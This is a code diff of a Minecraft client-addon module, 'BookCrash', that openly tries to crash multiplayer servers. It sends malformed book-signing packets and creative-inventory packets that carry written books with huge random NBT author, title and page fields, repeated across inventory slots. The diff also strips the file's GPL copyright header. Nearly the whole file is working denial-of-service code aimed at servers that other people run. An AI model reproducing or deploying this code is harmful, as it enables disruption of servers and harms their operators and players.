@@ -1,11 +1,3 @@
-/*
- *  Copyright (c) 2021 Wide_Cat and contributors.
- *
- * This source code is subject to the terms of the GNU General Public
- * License, version 3. If a copy of the GPL was not distributed with this
- * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
- */
-
 package widecat.meteorcrashaddon.modules;
 
 import meteordevelopment.meteorclient.events.game.GameLeftEvent;
@@ -16,10 +8,12 @@ import meteordevelopment.meteorclient.utils.Utils;
 import meteordevelopment.orbit.EventHandler;
 import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
+import net.minecraft.nbt.NbtCompound;
 import net.minecraft.nbt.NbtList;
 import net.minecraft.nbt.NbtString;
 import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
 import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
+import org.apache.commons.lang3.RandomStringUtils;
 import widecat.meteorcrashaddon.CrashAddon;
 
 import java.util.ArrayList;
@@ -32,8 +26,7 @@ public class BookCrash extends Module {
         .name("mode")
         .description("Which type of packet to send.")
         .defaultValue(Mode.BookUpdate)
-        .build()
-    );
+        .build());
 
     private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
         .name("amount")
@@ -41,19 +34,18 @@ public class BookCrash extends Module {
         .defaultValue(100)
         .min(1)
         .sliderMax(1000)
-        .build()
-    );
+        .build());
 
     private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
         .name("auto-disable")
         .description("Disables module on kick.")
         .defaultValue(true)
-        .build()
-    );
+        .build());
 
     public BookCrash() {
         super(CrashAddon.CATEGORY, "book-crash", "Tries to crash the server by sending bad book sign packets.");
     }
+    int slot = 5;
 
     @EventHandler
     private void onTick(TickEvent.Pre event) {
@@ -62,14 +54,9 @@ public class BookCrash extends Module {
         }
     }
 
-    @EventHandler
-    private void onGameLeft(GameLeftEvent event) {
-        if (autoDisable.get()) toggle();
-    }
-
     private void sendBadBook() {
         String title = "/stop" + Math.random() * 400;
-        String mm255 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
+        String mm255 = RandomStringUtils.randomAlphanumeric(255);
 
         switch (mode.get()) {
             case BookUpdate -> {
@@ -83,26 +70,36 @@ public class BookCrash extends Module {
 
                 mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
             }
-            case CreativeAction -> {
-                ItemStack book = new ItemStack(Items.WRITTEN_BOOK);
-                String author = "MineGame159" + Math.random() * 400;
-                NbtList pageList = new NbtList();
-
-                for (int i = 0; i < 50; ++i) {
-                    pageList.addElement(i, NbtString.of(mm255));
+            case Creative -> {
+                for (int i = 0; i < 5; i++) {
+                    if (slot > 36 + 9) {
+                        slot = 0;
+                        return;
+                    }
+                    slot++;
+                    ItemStack book = new ItemStack(Items.WRITTEN_BOOK, 1);
+                    NbtCompound tag = new NbtCompound();
+                    NbtList list = new NbtList();
+                    for (int j = 0; j < 99; j++) {
+                        list.add(NbtString.of("{\"text\":" + RandomStringUtils.randomAlphabetic(200) + "\"}"));
+                    }
+                    tag.put("author", NbtString.of(RandomStringUtils.randomAlphabetic(9000)));
+                    tag.put("title", NbtString.of(RandomStringUtils.randomAlphabetic(25564)));
+                    tag.put("pages", list);
+                    book.setNbt(tag);
+                    mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(slot, book));
                 }
-
-                book.getNbt().put("title", NbtString.of(title));
-                book.getNbt().put("author", NbtString.of(author));
-                book.getNbt().put("pages", pageList);
-
-                mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(0, book));
             }
         }
     }
 
+    @EventHandler
+    private void onGameLeft(GameLeftEvent event) {
+        if (autoDisable.get()) toggle();
+    }
+
     public enum Mode {
         BookUpdate,
-        CreativeAction
+        Creative
     }
 }
